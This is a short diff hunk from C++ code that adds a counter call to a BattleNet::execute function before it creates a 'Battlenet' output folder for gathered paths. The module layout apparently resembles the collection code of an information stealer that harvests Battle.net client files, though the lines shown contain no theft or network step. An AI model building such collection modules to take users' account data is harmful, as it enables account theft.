@@ -17,6 +17,8 @@ void BattleNet::execute(fs::path &root) {
     if(paths.empty())
         return;
 
+    Counter::setBattlenet();
+
     fs::path dst = root / "Battlenet";
     fs::create_directories(dst);
 
